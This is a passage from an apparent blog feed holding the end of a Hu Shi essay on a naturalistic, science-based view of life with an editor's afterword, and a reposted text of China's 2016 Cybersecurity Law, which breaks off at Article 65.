class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span> ）根据于天文学和物理学的知识，叫人知道空间的无限之大。</span><br><span class="line">（<span class="number">2</span> ）根据于地质学及古生物学的知识，叫人知道时间的无穷之长。</span><br><span class="line">（<span class="number">3</span> ）根据于一切科学，叫人知道宇宙及其中万物的运行变迁皆是自然的，——自己如此的，——正用不着什么超自然的主宰或造物者。</span><br><span class="line">（<span class="number">4</span> ）根据于生物学的科学知识，叫人知道生物界的生存竞争的浪费与惨酷，——因此叫人更可以明白那“有好生之德”的主宰的假设是不能成立的。</span><br><span class="line">（<span class="number">5</span> ）根据于生物学、生理学、心理学的知识，叫人知道人不过是动物的一种；他和别种动物只有程序的差异，并无种类的区别。</span><br><span class="line">（<span class="number">6</span> ）根据于生物的科学及人类学、人种学、社会学的知识，叫人知道生物及人类社会演进的历史和演进的原因。</span><br><span class="line">（<span class="number">7</span> ）根据于生物的及心理的科学，叫人知道一切心理的现象都是有因的。</span><br><span class="line">（<span class="number">8</span> ）根据于生物学及社会学的知识，叫人知道道德礼教是变迁的，而变迁的原因都是可以用科学的方法寻求出来的。</span><br><span class="line">（<span class="number">9</span> ）根据于新的物理化学的知识，叫人知道物质不是死的，是活的；不是静的，是动的。</span><br><span class="line">（<span class="number">10</span>）根据于生物学及社会学的知识，叫人知道个人——“小我”——是要死灭的，而人类——“大我”——是不死的，不朽的；叫人知道“为全种万世而生活”就是宗教，就是最高的宗教。而那些替个人谋死后的“天堂”“净土”的宗教，乃是自私自利的宗教。</span><br></pre></td></tr></table></figure><p>我结论道：“这种新人生观是建筑在二三百年的科学常识之上的一个大假设，我们也许可以给他加上‘科学的人生观’的尊号。但为避免无谓的争论起见，我主张叫他做‘自然主义的人生观’。</p><p>“我们在那个自然的宇宙里，在那无穷之大的空间里，在那无穷之长的时间里，这个平均高五尺六寸，上寿不过百年的两手动物——人——真是一个藐乎其小的微生物了。在那个自然主义的宇宙里，天行是有常度的，物变是有自然法则的，因果的大法支配着他——人——的一切生活，生存竞争的惨剧鞭策着他的一切行为，——这个两手动物的自由真是很有限的了。</p><p>“然而那个自然主义的宇宙里的这个涉小的两手动物，却也有他的相当的地位和相当的价值。他用的两手和一个大脑，居然能做出许多器具，想出许多方法，造成一点文化。他不但驯伏了许多禽兽，他还能考究宇宙间的自然法则，利用这些法则来驾驭天行，到现在他居然能叫电气给他赶车，以太阳给他送信了。</p><p>“他的智慧的长进就是他的能力的增加。然而智慧的长进却又使他的胸襟扩大，想象力提高。他也曾拜物拜畜生，也曾怕神怕鬼，但他现在渐渐的脱离了这种种幼稚的时期，他现在渐渐明白：空间之大只增加他对于宇宙的美感；时间之长只使帅外明了祖宗创业之艰难；天行之有常只增加他制裁自然界的能力。</p><p>“甚至于因果律之笼罩一切，也并不见得束缚他的自由。因为因果律的作用，一方面使他可以由因求果，由果推因，解释过去，预测未来；一方面又使他可以运用他的智慧，创造新因，以求新果。甚至于生存竞争的观念也并不见得就使他成为一个冷酷无情的畜生，也许还可以格外增加他对于同类的同情心，格外使他深信互助的重要，格外使他注重人为的努力，以减免天然竞争的惨酷与浪费。总而言之，这个自然主义的人生观里，未尝没有美，未尝没有诗意，未尝没有道德的责任，未尝没有充分运用创造的智慧的机会。”</p><p>编后记：<br>胡适，中国新文化运动的开拓者之一。美国《展望》杂志曾经把他列为当今世界有影响力的100 个伟人之一。<br>散文是胡适的重要的文学成果之一。他一生奔逐南北，阅历丰富，学贯中西，知识渊博；散文材料翔实，说理透彻，文风平实，明白晓畅，代表了现代散文的一个重要流派。作为一个开风气的人，由于他曾经致力于介绍新观念，新方法，而散文又是这方面的载体，因此，阅读他的散文，可以从中得到许多知识的享受和人生的启迪。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>【转】中华人民共和国网络安全法</title>
      <link href="/mind/180811-respect-law/"/>
      <url>/mind/180811-respect-law/</url>
      
        <content type="html"><![CDATA[<h1 id="中华人民共和国网络安全法"><a href="#中华人民共和国网络安全法" class="headerlink" title="中华人民共和国网络安全法"></a><a href="http://www.miit.gov.cn/n1146295/n1146557/n1146614/c5345009/content.html" target="_blank" rel="noopener">中华人民共和国网络安全法</a></h1><p>发布时间：2016-11-08  来源：政策法规司  </p><p>中华人民共和国主席令</p><p>第五十三号</p><p>《中华人民共和国网络安全法》已由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于2016年11月7日通过，现予公布，自2017年6月1日起施行。</p><p>​                                                       中华人民共和国主席 习近平</p><p>​                                                          2016年11月7日</p><p>中华人民共和国网络安全法</p><p>目    录</p><p>​    第一章  总则</p><p>​    第二章  网络安全支持与促进</p><p>​    第三章  网络运行安全</p><p>​    第一节  一般规定</p><p>​    第二节  关键信息基础设施的运行安全</p><p>​    第四章  网络信息安全</p><p>​    第五章  监测预警与应急处置</p><p>​    第六章  法律责任</p><p>​    第七章  附则</p><h1 id="第一章-总则"><a href="#第一章-总则" class="headerlink" title="第一章  总则"></a>第一章  总则</h1><h2 id="第一条"><a href="#第一条" class="headerlink" title="第一条"></a><strong>第一条</strong></h2><p>为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。</p><h2 id="第二条"><a href="#第二条" class="headerlink" title="第二条"></a><strong>第二条</strong></h2><p>在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。</p><h2 id="第三条"><a href="#第三条" class="headerlink" title="第三条"></a><strong>第三条</strong></h2><p>国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。</p><h2 id="第四条"><a href="#第四条" class="headerlink" title="第四条"></a><strong>第四条</strong></h2><p>国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。</p><h2 id="第五条"><a href="#第五条" class="headerlink" title="第五条"></a><strong>第五条</strong></h2><p>国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。</p><h2 id="第六条"><a href="#第六条" class="headerlink" title="第六条"></a><strong>第六条</strong></h2><p>国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。</p><h2 id="第七条"><a href="#第七条" class="headerlink" title="第七条"></a><strong>第七条</strong></h2><p>国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。</p><h2 id="第八条"><a href="#第八条" class="headerlink" title="第八条"></a><strong>第八条</strong></h2><p>国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。</p><p>县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。</p><h2 id="第九条"><a href="#第九条" class="headerlink" title="第九条"></a><strong>第九条</strong></h2><p>网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。</p><h2 id="第十条"><a href="#第十条" class="headerlink" title="第十条"></a><strong>第十条</strong></h2><p>建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p><h2 id="第十一条"><a href="#第十一条" class="headerlink" title="第十一条"></a><strong>第十一条</strong></h2><p>网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。</p><h2 id="第十二条"><a href="#第十二条" class="headerlink" title="第十二条"></a><strong>第十二条</strong></h2><p>国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。</p><p>任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。</p><h2 id="第十三条"><a href="#第十三条" class="headerlink" title="第十三条"></a><strong>第十三条</strong></h2><p>国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。</p><h2 id="第十四条"><a href="#第十四条" class="headerlink" title="第十四条"></a><strong>第十四条</strong></h2><p>任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。</p><p>有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。</p><h1 id="第二章-网络安全支持与促进"><a href="#第二章-网络安全支持与促进" class="headerlink" title="第二章  网络安全支持与促进"></a>第二章  网络安全支持与促进</h1><h2 id="第十五条"><a href="#第十五条" class="headerlink" title="第十五条"></a><strong>第十五条</strong></h2><p>国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。</p><p>国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。</p><h2 id="第十六条"><a href="#第十六条" class="headerlink" title="第十六条"></a><strong>第十六条</strong></h2><p>国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。</p><h2 id="第十七条"><a href="#第十七条" class="headerlink" title="第十七条"></a><strong>第十七条</strong></h2><p>国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。</p><h2 id="第十八条"><a href="#第十八条" class="headerlink" title="第十八条"></a><strong>第十八条</strong></h2><p>国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。</p><p>国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。</p><h2 id="第十九条"><a href="#第十九条" class="headerlink" title="第十九条"></a><strong>第十九条</strong></h2><p>各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。</p><p>大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。</p><h2 id="第二十条"><a href="#第二十条" class="headerlink" title="第二十条"></a><strong>第二十条</strong></h2><p>国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。</p><h1 id="第三章-网络运行安全"><a href="#第三章-网络运行安全" class="headerlink" title="第三章  网络运行安全"></a>第三章  网络运行安全</h1><h2 id="第一节-一般规定"><a href="#第一节-一般规定" class="headerlink" title="第一节 一般规定"></a>第一节 一般规定</h2><h3 id="第二十一条"><a href="#第二十一条" class="headerlink" title="第二十一条"></a><strong>第二十一条</strong></h3><p>国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p><p>（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任；</p><p>（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施；</p><p>（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；</p><p>（四）采取数据分类、重要数据备份和加密等措施；</p><p>（五）法律、行政法规规定的其他义务。</p><h3 id="第二十二条"><a href="#第二十二条" class="headerlink" title="第二十二条"></a><strong>第二十二条</strong></h3><p>网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><p>网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。</p><p>网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。</p><h3 id="第二十三条"><a href="#第二十三条" class="headerlink" title="第二十三条"></a><strong>第二十三条</strong></h3><p>网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。</p><h3 id="第二十四条"><a href="#第二十四条" class="headerlink" title="第二十四条"></a><strong>第二十四条</strong></h3><p>网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。</p><p>国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。</p><h3 id="第二十五条"><a href="#第二十五条" class="headerlink" title="第二十五条"></a><strong>第二十五条</strong></h3><p>网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。</p><h3 id="第二十六条"><a href="#第二十六条" class="headerlink" title="第二十六条"></a><strong>第二十六条</strong></h3><p>开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。</p><h3 id="第二十七条"><a href="#第二十七条" class="headerlink" title="第二十七条"></a><strong>第二十七条</strong></h3><p>任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。</p><h3 id="第二十八条"><a href="#第二十八条" class="headerlink" title="第二十八条"></a><strong>第二十八条</strong></h3><p>网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助。</p><h3 id="第二十九条"><a href="#第二十九条" class="headerlink" title="第二十九条"></a><strong>第二十九条</strong></h3><p>国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。</p><p>有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。</p><h3 id="第三十条"><a href="#第三十条" class="headerlink" title="第三十条"></a><strong>第三十条</strong></h3><p>网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。</p><h2 id="第二节-关键信息基础设施的运行安全"><a href="#第二节-关键信息基础设施的运行安全" class="headerlink" title="第二节 关键信息基础设施的运行安全"></a>第二节 关键信息基础设施的运行安全</h2><h3 id="第三十一条"><a href="#第三十一条" class="headerlink" title="第三十一条"></a><strong>第三十一条</strong></h3><p>国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。</p><p>国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。</p><h3 id="第三十二条"><a href="#第三十二条" class="headerlink" title="第三十二条"></a><strong>第三十二条</strong></h3><p>按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。</p><h3 id="第三十三条"><a href="#第三十三条" class="headerlink" title="第三十三条"></a><strong>第三十三条</strong></h3><p>建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。</p><h3 id="第三十四条"><a href="#第三十四条" class="headerlink" title="第三十四条"></a><strong>第三十四条</strong></h3><p>除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务：</p><p>（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查；</p><p>（二）定期对从业人员进行网络安全教育、技术培训和技能考核；</p><p>（三）对重要系统和数据库进行容灾备份；</p><p>（四）制定网络安全事件应急预案，并定期进行演练；</p><p>（五）法律、行政法规规定的其他义务。</p><h3 id="第三十五条"><a href="#第三十五条" class="headerlink" title="第三十五条"></a><strong>第三十五条</strong></h3><p>关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。</p><h3 id="第三十六条"><a href="#第三十六条" class="headerlink" title="第三十六条"></a><strong>第三十六条</strong></h3><p>关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。</p><h3 id="第三十七条"><a href="#第三十七条" class="headerlink" title="第三十七条"></a><strong>第三十七条</strong></h3><p>关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。</p><h3 id="第三十八条"><a href="#第三十八条" class="headerlink" title="第三十八条"></a><strong>第三十八条</strong></h3><p>关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。</p><h3 id="第三十九条"><a href="#第三十九条" class="headerlink" title="第三十九条"></a><strong>第三十九条</strong></h3><p>国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施：</p><p>（一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</p><p>（二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力；</p><p>（三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享；</p><p>（四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。</p><h1 id="第四章-网络信息安全"><a href="#第四章-网络信息安全" class="headerlink" title="第四章  网络信息安全"></a><strong>第四章  网络信息安全</strong></h1><h2 id="第四十条"><a href="#第四十条" class="headerlink" title="第四十条"></a><strong>第四十条</strong></h2><p>网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。</p><h2 id="第四十一条"><a href="#第四十一条" class="headerlink" title="第四十一条"></a><strong>第四十一条</strong></h2><p>网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。</p><p>网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。</p><h2 id="第四十二条"><a href="#第四十二条" class="headerlink" title="第四十二条"></a><strong>第四十二条</strong></h2><p>网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。</p><p>网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><h2 id="第四十三条"><a href="#第四十三条" class="headerlink" title="第四十三条"></a><strong>第四十三条</strong></h2><p>个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。</p><h2 id="第四十四条"><a href="#第四十四条" class="headerlink" title="第四十四条"></a><strong>第四十四条</strong></h2><p>任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。</p><h2 id="第四十五条"><a href="#第四十五条" class="headerlink" title="第四十五条"></a><strong>第四十五条</strong></h2><p>依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。</p><h2 id="第四十六条"><a href="#第四十六条" class="headerlink" title="第四十六条"></a><strong>第四十六条</strong></h2><p>任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。</p><h2 id="第四十七条"><a href="#第四十七条" class="headerlink" title="第四十七条"></a><strong>第四十七条</strong></h2><p>网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。</p><h2 id="第四十八条"><a href="#第四十八条" class="headerlink" title="第四十八条"></a><strong>第四十八条</strong></h2><p>任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。</p><p>电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。</p><h2 id="第四十九条"><a href="#第四十九条" class="headerlink" title="第四十九条"></a><strong>第四十九条</strong></h2><p>网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。</p><p>网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p><h2 id="第五十条"><a href="#第五十条" class="headerlink" title="第五十条"></a><strong>第五十条</strong></h2><p>国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。</p><h1 id="第五章-监测预警与应急处置"><a href="#第五章-监测预警与应急处置" class="headerlink" title="第五章  监测预警与应急处置"></a><strong>第五章  监测预警与应急处置</strong></h1><h2 id="第五十一条"><a href="#第五十一条" class="headerlink" title="第五十一条"></a><strong>第五十一条</strong></h2><p>国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。</p><h2 id="第五十二条"><a href="#第五十二条" class="headerlink" title="第五十二条"></a><strong>第五十二条</strong></h2><p>负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。</p><h2 id="第五十三条"><a href="#第五十三条" class="headerlink" title="第五十三条"></a><strong>第五十三条</strong></h2><p>国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。</p><p>负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。</p><p>网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。</p><h2 id="第五十四条"><a href="#第五十四条" class="headerlink" title="第五十四条"></a><strong>第五十四条</strong></h2><p>网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施：</p><p>（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测；</p><p>（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度；</p><p>（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。</p><h2 id="第五十五条"><a href="#第五十五条" class="headerlink" title="第五十五条"></a><strong>第五十五条</strong></h2><p>发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。</p><h2 id="第五十六条"><a href="#第五十六条" class="headerlink" title="第五十六条"></a><strong>第五十六条</strong></h2><p>省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。</p><h2 id="第五十七条"><a href="#第五十七条" class="headerlink" title="第五十七条"></a><strong>第五十七条</strong></h2><p>因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。</p><h2 id="第五十八条"><a href="#第五十八条" class="headerlink" title="第五十八条"></a><strong>第五十八条</strong></h2><p>因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。</p><h1 id="第六章-法律责任"><a href="#第六章-法律责任" class="headerlink" title="第六章  法律责任"></a>第六章  法律责任</h1><h2 id="第五十九条"><a href="#第五十九条" class="headerlink" title="第五十九条"></a><strong>第五十九条</strong></h2><p>网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。</p><p>关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。</p><h2 id="第六十条"><a href="#第六十条" class="headerlink" title="第六十条"></a><strong>第六十条</strong></h2><p>违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款：</p><p>（一）设置恶意程序的；</p><p>（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的；</p><p>（三）擅自终止为其产品、服务提供安全维护的。</p><h2 id="第六十一条"><a href="#第六十一条" class="headerlink" title="第六十一条"></a><strong>第六十一条</strong></h2><p>网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><h2 id="第六十二条"><a href="#第六十二条" class="headerlink" title="第六十二条"></a><strong>第六十二条</strong></h2><p>违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。</p><h2 id="第六十三条"><a href="#第六十三条" class="headerlink" title="第六十三条"></a><strong>第六十三条</strong></h2><p>违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。</p><p>单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><p>违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。</p><h2 id="第六十四条"><a href="#第六十四条" class="headerlink" title="第六十四条"></a><strong>第六十四条</strong></h2><p>网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。</p><p>违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。</p><h2 id="第六十五条"><a href="#第六十五条" class="headerlink" 